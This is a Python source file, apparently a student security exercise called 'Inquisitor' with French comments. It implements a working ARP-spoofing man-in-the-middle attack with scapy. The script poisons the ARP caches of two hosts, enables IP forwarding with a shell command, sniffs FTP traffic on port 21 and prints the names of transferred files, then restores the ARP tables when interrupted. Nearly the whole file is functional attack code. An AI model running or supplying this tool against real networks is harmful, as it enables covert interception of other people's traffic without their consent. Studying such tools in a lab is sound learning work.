from parsing_inquisitor import parsing_inputs
import scapy.all as scapy

import time
import os # ip fowarding
import sys

import re

"""
	ft but: récupère chaque packet capturé
	- Les communications FTP sont basées sur le protocole TCP
	- Les communications FTP utilisent le port 21 (dport=destination port, sport=source
"""

def recup_packet(packet):
	if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
		ftp_data = packet[scapy.Raw].load
		if b"RETR" in ftp_data:
			print(f"\033[1;35;40mFile downloaded: \033[0;37;40m{ftp_data[5:].decode('UTF8','replace')}")
		elif b"STOR" in ftp_data:
			print(f"\033[1;32;40mFile Uploaded: \033[0;37;40m{ftp_data[5:].decode('UTF8','replace')}")

# renvoie un packet avec les bons IPs et MAC addr de base
def restore_arp_tables(ipsrc, iptarget, macsrc, mactarget):
	try:
		# cree un header ARP
		# op=1:who-has (asking for the mac addr); op=2: is-at (reply with the MAC address corresponding);
		packet = scapy.ARP(pdst=iptarget, hwdst=mactarget, psrc=ipsrc, hwsrc=macsrc, op=2)
		scapy.send(packet,verbose=False)
		packet2 = scapy.ARP(pdst=ipsrc, hwdst=macsrc, psrc=iptarget, hwsrc=mactarget, op=2)
		scapy.send(packet2,verbose=False)
	except Exception as e:
		print (f"An error occur: {e}...\nARP tables may have not be restored properly...")
		exit (1)

# permet à l'hôte de fonctionner comme un routeur transmettant des paquets entre deux réseaux
def enable_ip_forwarding():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def poisoning(iptarget, mactarget, ippoisoned):
	try:
		packet = scapy.ARP(pdst=iptarget, hwdst=mactarget, psrc=ippoisoned, op=2)
		scapy.send(packet, verbose=False)
		print(f" --- IP= {iptarget} has been poisoned 🧪--- \n")
	except Exception as e:
		print (f"An error occured: {e}...\nARP spoofing has encountered an issue")

def main():
	try:
		parsing_inputs()
		enable_ip_forwarding()
		while True:
			try:
				poisoning(sys.argv[3], sys.argv[4], sys.argv[1])
				poisoning(sys.argv[1], sys.argv[2], sys.argv[3])
				scapy.sniff(filter="tcp port 21", prn=recup_packet, store=0)
				time.sleep(2)
			except Exception as e:
				print (f"An error occured during the ARP spoofing action: {e}")
				return

	except KeyboardInterrupt:
		print ('\033[0;31mInquisitor process has been stopped...\nRestoring the initial state...\n\033[0m')
		restore_arp_tables(sys.argv[1], sys.argv[3], sys.argv[2], sys.argv[4])
		return
	except Exception as e:
		print (f"An error occured during the ARP spoofing processus: {e}")
		return

if __name__ == '__main__':
	main()
